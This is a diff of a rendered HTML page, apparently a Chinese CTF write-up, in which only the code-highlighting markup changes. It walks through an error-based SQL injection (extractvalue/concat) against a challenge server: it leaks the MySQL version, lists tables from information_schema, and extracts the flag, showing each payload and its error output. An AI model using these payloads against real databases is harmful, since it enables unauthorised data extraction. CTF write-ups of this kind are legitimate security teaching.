@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -478,12 +479,16 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p><a href="http://54.223.247.98:8023/" target="_blank" rel="external">http://54.223.247.98:8023/</a><br>要通过post传递参数,不然过滤很严</p>
-<p>##<br>尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, @@version,0x7e))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
+<p>##<br>尝试</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> @<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>XPATH syntax error: ‘~5.1.73~’</p>
 </blockquote>
 <p>可以这样子报错注入的还有updateXML</p>
-<p>爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, substr((<span class="keyword">SeleCt</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> table_name ) <span class="keyword">from</span> information_schema.tables),<span class="number">384</span>)))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
+<p>爆表名</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SeleCt</span> group_concat<span class="token punctuation">(</span><span class="token keyword">distinct</span> table_name <span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">384</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>XPATH syntax error: ‘~e,flag_is_here’</p>
 </blockquote>
@@ -493,7 +498,9 @@
 <blockquote>
 <p>这个时候应该怎么办呢</p>
 </blockquote>
-<p>还好这道题目字段就是<code>flag</code><br>所以这样子就能拿到结果<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, (<span class="keyword">SeleCt</span> flag <span class="keyword">from</span> flag_is_here),<span class="number">0x7e</span>))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
+<p>还好这道题目字段就是<code>flag</code><br>所以这样子就能拿到结果</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SeleCt</span> flag <span class="token keyword">from</span> flag_is_here<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>XPATH syntax error: ‘~SYC{O0o._O0o._O0o._O0o._O0o.}~’</p>
 </blockquote>
